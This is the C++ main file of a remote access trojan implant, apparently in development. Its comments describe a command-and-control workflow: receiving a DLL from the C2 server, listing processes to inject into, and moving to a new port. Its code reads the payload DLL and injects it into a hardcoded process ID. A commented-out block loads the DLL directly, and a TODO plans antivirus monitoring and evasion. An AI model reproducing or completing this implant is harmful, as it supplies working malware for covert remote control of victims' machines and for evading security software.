// Patrick Sacchet
// Version 1.0
// RAT-Exe-Main.cpp : This file contains the 'main' function. Program execution begins and ends there.

#include "RAT-Exe-Main.h"

HRESULT main()
{
    HRESULT status = ERROR_SUCCESS;
    HANDLE hFile, hPayload = NULL;
    DWORD dwBytesRead = 0;
    CHAR msgBuf[MAX_BUFFER_SIZE], *fileContents = NULL, *fileBytes = NULL;
    UINT64 fileSize = 0;
    char filePath [] = "C:\\RAT-Dll.dll";
    DWORD lastError, bufferSize;
    LPCWSTR dllName = DLL_NAME;
    HMODULE hGetProcIDLL = LoadLibrary(dllName);
    LARGE_INTEGER payloadSize = { 0 };

    OutputDebugStringA("RAT-Exe-Main::main - Initializing program...\n");


    // Exe opens port and waits...

    // C2 reaches out establishes connection

    // C2 sends filepath to write the dll to 

    // C2 sends dll bytes

    // Implant exe writes bytes to filepath

    // Implant parses running processes for those it can inject into, send back to C2

    // C2 chooses PID and sends to implant

    // Implant exe injects dll into process, which runs new thread and opens new port; exe closes current port and shuts down



    // Open the payload to check the size 
    hPayload = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hPayload == INVALID_HANDLE_VALUE)
    {
        sprintf_s(msgBuf, "RAT-Exe-Main::main - Failure from CreateFileA 0x%X\n", GetLastError());
        OutputDebugStringA(msgBuf);
        goto cleanup;
    }

    if (!GetFileSizeEx(hPayload, &payloadSize))
    {
        sprintf_s(msgBuf, "RAT-Exe-Main::main - Failure from GetFileSizeEx 0x%X\n", GetLastError());
        OutputDebugStringA(msgBuf);
        goto cleanup;
    }

    sprintf_s(msgBuf, "RAT-Exe-Main::main - Payload is %lld bytes large\n", payloadSize.QuadPart);
    OutputDebugStringA(msgBuf);
    
    // lets just test inject first to get that working 
        // paint inject test 
    status = inject(6568, 15, filePath);
    if (status != ERROR_SUCCESS)
    {
        sprintf_s(msgBuf, "RAT-Exe::main - Failure from inject %d\n", status);
        OutputDebugStringA(msgBuf);
        goto cleanup;
    }
    else
    {
        OutputDebugStringA("RAT-Exe::main - Successfully injected payload\n");
    }




    // If we are in a 'operational' space load our DLL into memory so it can call back to our client 
    

    /*/if (!hGetProcIDLL)
    {
        // why do we end up here 
        OutputDebugStringA("RAT-Exe-Main.cpp::main - Could not successfully load target DLL\n");
        lastError = GetLastError();
        sprintf_s(msgBuf, "RAT-Exe-Main::main - Last error: %08x) \n", lastError);
        OutputDebugStringA(msgBuf);
        return FAILURE;
    }

    OutputDebugStringA("RAT-Exe.cpp-Main::main - Successfully loaded target DLL\n");

    // Grab proc address to call into 
    typedef UINT (WINAPI* DLLFUNCPOINT) (HMODULE,DWORD,LPVOID);
    DLLFUNCPOINT DllFuncPoint;
    DllFuncPoint = (DLLFUNCPOINT)GetProcAddress(hGetProcIDLL, "DllMain");
    if (!DllFuncPoint)
    {
        printf("Failed to get function pointer in DLL!\n");
        FreeLibrary(hGetProcIDLL);
        return FAILURE;
    }

    else
    {
        UINT returnValue = 0;
        returnValue = DllFuncPoint(hGetProcIDLL, DLL_PROCESS_ATTACH, NULL);

        if (!returnValue)
        {
            OutputDebugStringA("RAT-Exe-Main.cpp::main - Call to DLL main failed \n");
            return FAILURE;
        }

        else
        {
            OutputDebugStringA("RAT-Exe-Main.cpp::main - Call to DLL main was successful! \n");
            FreeLibrary(hGetProcIDLL);
            return SUCCESS;
        }
    }
    */

    // While our DLL handles commands from client continue to survey the system, calling DLL_PROCESS_DETACH once we suspect a threat
    // TODO: Implement further antivirus monitoring 
cleanup:
    return status;
}


